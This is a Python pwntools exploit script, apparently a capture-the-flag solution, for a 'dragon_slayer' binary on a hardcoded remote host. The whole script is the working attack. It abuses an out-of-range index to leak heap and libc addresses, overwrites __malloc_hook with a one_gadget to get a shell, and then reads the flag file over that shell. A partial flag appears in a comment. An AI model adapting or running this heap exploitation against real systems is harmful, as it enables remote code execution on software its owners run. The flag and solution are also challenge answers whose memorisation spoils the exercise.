#!/usr/bin/env python
from pwn import *

# FLAG{1t_4ctually_IS_wi7hin_b0und...}

e , l = ELF( 'dragon_slayer' ) , ELF( './libc.so.6-14c22be9aa11316f89909e4237314e009da38883' )

context.arch = 'amd64'

host , port = '35.201.132.60' , 13337
y = remote( host , port )
#y = process( './dragon_slayer' )
#y = process( './dragon_slayer' , env = { 'LD_PRELOAD' : './libc.so.6' } )


def lis():
    y.sendlineafter( 'ice:' , '1' )

def slec( idx ):
    y.sendlineafter( 'ice:' , '2' )
    y.sendlineafter( ':' , str( idx ) )

def start():
    y.sendlineafter( 'ice:' , '3' )

def dragon( des , val ):
    y.sendlineafter( 'ice:' , '1' )
    y.sendlineafter( ':' , str( des ) )
    y.sendlineafter( ':' , str( val ) )

def slime():
    y.sendlineafter( 'ice:' , '2' )

def craf():
    y.sendlineafter( 'ice:' , '3' )

def slee():
    y.sendlineafter( 'ice:' , '4' )

def chg_name( name ):
    y.sendlineafter( 'ice:' , '5' )
    y.sendafter( ':' , name )

def bac():
    y.sendlineafter( 'ice:' , '87' )




vul = 0x5555555555555555

slec( 0 )
start()
slime()
slime()
slime()
bac()

slec( vul + 1 )
start()
slee()
craf()
bac()
lis()

y.recvuntil( 'OrzanggeOrzangge' )
heap = u64( y.recv(6).ljust( 8 , '\x00' ) ) - 0x170
log.success( 'heap -> %s' % hex( heap ) )

slec( vul + 1 )
start()
for _ in xrange(3): slime()
chg_name( p64( heap + 0x170 ) + p32( 0x7777777 ) + p32( 0x777777 ) )
bac()
lis()

y.recvuntil( 'durability:' )
l.address += int( y.recvline().strip() ) - 0x3c4b78
log.success( 'libc -> %s' % hex( l.address ) )

slec( vul + 1 )
start()
chg_name( p64( heap + 0x3f ) )
bac()

slec( 0 )
start()
for _ in xrange( 14 ):
    print _
    slee()
for _ in xrange( 0x81 ): slime()

one = 0xf0274

dragon( l.symbols['__malloc_hook'] , l.address + one )

craf()

sleep( 0.07 )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()